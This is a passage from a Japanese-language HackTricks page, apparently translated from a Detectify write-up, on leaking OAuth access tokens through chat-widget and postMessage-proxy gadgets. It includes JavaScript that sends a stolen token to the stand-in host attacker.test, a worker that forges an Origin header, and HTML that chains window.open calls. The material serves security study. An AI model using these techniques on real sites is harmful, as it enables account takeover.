if(b) { b.postMessage({type: 'launch-chat'}, '*'); }
}, 500);
}
```
4. 被害者がリンクをクリックしてエラーページに移動し、チャットが起動し、チャットapi-tokenが作成されます。悪意のあるページ上のチャットウィジェットのiframeのリロードにより、postMessageを介して`api-token`を取得し、その後、被害者の現在のURLをAPIで確認できます：

```javascript
function lookInApi(token) {
var look = setInterval(function() {
fetch('https://fetch-server-side.attacker.test/?token=' + token).then(e => e.json()).then(e => {
if (e &&
e.api_data &&
e.api_data.current_url &&
e.api_data.current_url.indexOf('access_token') !== -1) {
var payload = e.api_data.current_url
document.getElementById('leak').innerHTML = 'Attacker now has the token: ' + payload;
clearInterval(look);
}
});
}, 2000);
}
```
5. `https://fetch-server-side.attacker.test/?token=xxx`のサーバーサイドページは、追加されたOriginヘッダを使用してAPIコールを行い、Chat-APIが正当なオリジンとして使用していると思わせます：

```javascript
addEventListener('fetch', event => {
event.respondWith(handleRequest(event.request))
})
async function getDataFromChatApi(token) {
return await fetch('https://chat-widget.example.com/api', {headers:{Origin: 'https://example.com', 'Chat-Api-Token': token}});
}
function handleRequest(request) {
const token = request.url.match('token=([^&#]+)')[1] || null;
return token ? getDataFromChatApi(token) : null;
}
```
6. 被害者がリンクをクリックしてOAuthダンスを経てトークンが追加されたエラーページに移動すると、チャットウィジェットが突然表示され、現在のURLが登録され、攻撃者は被害者のアクセストークンを取得します。

## URLを漏洩させるための他のアイデア

まだ見つかっていないさまざまなタイプのガジェットが存在します。以下は、利用可能なレスポンスモードを使用してURLを漏洩させる可能性のあるケースの一つです。

### 任意のpostMessageをオープナーにルーティングするドメイン上のページ

すべての`web_message`レスポンスタイプは、オリジンのパスを検証できないため、有効なドメイン上の任意のURLはトークンを含むpostMessageを受け取ることができます。ドメイン上のいずれかのページにpostMessageリスナープロキシが存在し、それが送信されたメッセージを受け取り、すべてを`opener`に送信する場合、ダブルウィンドウ.openチェーンを作成できます：

攻撃者のページ1：
```html
<a href="#" onclick="a=window.open('attacker2.html'); return false;">Accept cookies</a>
```
攻撃者のページ2：
```html
<a href="#" onclick="b=window.open('https://accounts.google.com/oauth/...?', '', 'x'); location.href = 'https://example.com/postmessage-proxy'; return false;">Login to google</a>
```
そして、`https://example.com/postmessage-proxy` には次のようなものがあるでしょう:
```javascript
// Proxy all my messages to my opener:
window.onmessage=function(e) { opener.postMessage(e.data, '*'); }
```
OAuthプロバイダからトークンを`https://example.com`の正当なオリジンに送信するために、`web_message`-responseモードのいずれかを使用することができますが、エンドポイントはトークンをさらに`opener`に送信します。これは攻撃者のページです。

このフローは不可能に思えるかもしれませんし、2回のクリックが必要です。1回目は攻撃者とウェブサイトの間にopener関係を作成し、2回目はOAuthフローを起動し、正当なウェブサイトをOAuthポップアップのopenerとして持つことです。

OAuthプロバイダはトークンを正当なオリジンに送信します：

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget4-example1.png)

そして、正当なオリジンにはopenerへのpostMessageプロキシがあります：

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget4-example2.png)

これにより、攻撃者がトークンを取得します：

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget4-example3.png)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
